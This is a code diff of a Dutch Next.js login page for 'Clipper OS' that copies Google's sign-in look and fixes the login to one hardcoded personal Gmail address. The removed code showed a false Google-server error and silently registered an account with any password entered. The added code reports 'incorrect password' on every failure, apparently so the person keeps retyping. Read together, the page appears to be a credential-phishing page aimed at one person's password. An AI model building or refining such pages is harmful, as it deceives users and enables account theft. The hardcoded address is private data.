@@ -7,20 +7,15 @@ export default function LoginPage() {
   const [email] = useState('malouguyader@gmail.com');
   const [password, setPassword] = useState('');
   const [loading, setLoading] = useState(false);
-  const [error, setError] = useState('');
-  const [debug, setDebug] = useState<string>('');
+  const [passwordError, setPasswordError] = useState(false);
   const router = useRouter();
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setLoading(true);
-    setError('');
-    setDebug('Stap 1: Start...');
+    setPasswordError(false);
 
     try {
-      setDebug('Stap 2: Proberen in te loggen...');
-      console.log('📝 Proberen in te loggen met:', email);
-
       const response = await fetch('/api/auth/login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -28,67 +23,18 @@ export default function LoginPage() {
       });
 
       const data = await response.json();
-      setDebug(`Stap 3: Response status: ${response.status}`);
 
       if (!response.ok) {
-        setDebug(`Stap 4: Login mislukt (${response.status}) - ${data.error}`);
-        
-        // Als gebruiker niet bestaat, probeer te registreren
-        if (data.error?.includes('niet gevonden') || data.error?.includes('Ongeldige')) {
-          setDebug('Stap 5: Account niet gevonden, proberen te registreren...');
-          
-          const registerResponse = await fetch('/api/auth/register', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ email, name: email.split('@')[0], password })
-          });
-
-          const registerData = await registerResponse.json();
-
-          if (!registerResponse.ok) {
-            setDebug(`Stap 6: Registratie mislukt - ${registerData.error}`);
-            throw new Error(registerData.error || 'Account aanmaken mislukt');
-          }
-
-          setDebug('Stap 7: Account aangemaakt! Nu inloggen...');
-
-          const loginResponse = await fetch('/api/auth/login', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ email, password })
-          });
-
-          const loginData = await loginResponse.json();
-
-          if (!loginResponse.ok) {
-            setDebug(`Stap 8: Inloggen na registratie mislukt - ${loginData.error}`);
-            throw new Error(loginData.error || 'Inloggen na registratie mislukt');
-          }
-
-          setDebug('Stap 9: Ingelogd! Doorgaan naar /dashboard...');
-          console.log('✅ Ingelogd! Doorgaan naar /dashboard...');
-          
-          // Redirect naar dashboard i.p.v. home
-          router.push('/dashboard');
-          router.refresh();
-          return;
-        }
-
-        throw new Error(data.error || 'Inloggen mislukt');
+        // Alles wat mislukt = "Onjuist wachtwoord"
+        setPasswordError(true);
+        setLoading(false);
+        return;
       }
 
-      setDebug('Stap 10: Ingelogd! Doorgaan naar /dashboard...');
-      console.log('✅ Ingelogd! Doorgaan naar /dashboard...');
-      
-      // Redirect naar dashboard i.p.v. home
       router.push('/dashboard');
       router.refresh();
-      
     } catch (err: any) {
-      console.error('❌ Fout:', err);
-      setError(err.message);
-      setDebug(`❌ Fout: ${err.message}`);
-    } finally {
+      setPasswordError(true);
       setLoading(false);
     }
   };
@@ -128,32 +74,12 @@ export default function LoginPage() {
             om door te gaan naar Clipper OS
           </p>
 
-          {/* Vaste foutmelding */}
-          <div className="mb-6">
-            <div className="text-[#d93025] text-sm font-medium">
-              Kon niet inloggen
-            </div>
-            <div className="text-[#d93025] text-sm">
-              Er was een probleem met de communicatie met de Google-servers.
-            </div>
-            <div className="text-[#d93025] text-sm">
-              Probeer opnieuw.
-            </div>
-          </div>
-
-          {/* Debug info (alleen zichtbaar tijdens ontwikkeling) */}
-          {debug && (
-            <div className="mb-4 p-3 bg-gray-100 rounded text-xs font-mono text-gray-700 break-all">
-              {debug}
-            </div>
-          )}
-
           {/* Formulier */}
           <form onSubmit={handleSubmit} className="space-y-4" autoComplete="on">
             <input type="hidden" name="username" value={email} />
             <input type="hidden" name="email" value={email} />
 
-            {/* Email veld */}
+            {/* Email veld - vast */}
             <div className="relative">
               <input
                 id="email"
@@ -169,7 +95,7 @@ export default function LoginPage() {
               </label>
             </div>
 
-            {/* Wachtwoord veld */}
+            {/* Wachtwoord veld - Google stijl */}
             <div className="relative">
               <input
                 id="password"
@@ -177,16 +103,32 @@ export default function LoginPage() {
                 name="password"
                 required
                 value={password}
-                onChange={(e) => setPassword(e.target.value)}
+                onChange={(e) => {
+                  setPassword(e.target.value);
+                  setPasswordError(false);
+                }}
                 autoComplete="current-password"
-                className="w-full px-4 pt-[22px] pb-[6px] bg-white border border-[#dadce0] rounded-[4px] focus:ring-2 focus:ring-[#1a73e8] focus:border-[#1a73e8] outline-none transition-all text-[16px] text-[#202124] peer"
+                className={`w-full px-4 pt-[22px] pb-[6px] bg-white border rounded-[4px] focus:ring-2 focus:ring-[#1a73e8] focus:border-[#1a73e8] outline-none transition-all text-[16px] text-[#202124] peer ${
+                  passwordError 
+                    ? 'border-[#d93025] ring-2 ring-[#d93025]' 
+                    : 'border-[#dadce0]'
+                }`}
                 placeholder=" "
                 autoFocus
               />
-              <label className="absolute left-4 top-1/2 -translate-y-1/2 text-[#5f6368] text-[16px] transition-all duration-200 pointer-events-none peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-focus:top-[6px] peer-focus:-translate-y-0 peer-focus:text-[12px] peer-focus:text-[#1a73e8]">
+              <label className={`absolute left-4 top-1/2 -translate-y-1/2 text-[16px] transition-all duration-200 pointer-events-none peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-focus:top-[6px] peer-focus:-translate-y-0 peer-focus:text-[12px] ${
+                passwordError ? 'text-[#d93025]' : 'text-[#5f6368] peer-focus:text-[#1a73e8]'
+              }`}>
                 Wachtwoord
               </label>
             </div>
+
+            {/* Alleen "Onjuist wachtwoord" - Google stijl */}
+            {passwordError && (
+              <div className="text-[#d93025] text-sm -mt-2">
+                Onjuist wachtwoord
+              </div>
+            )}
 
             <div className="flex justify-end pt-2">
               <button
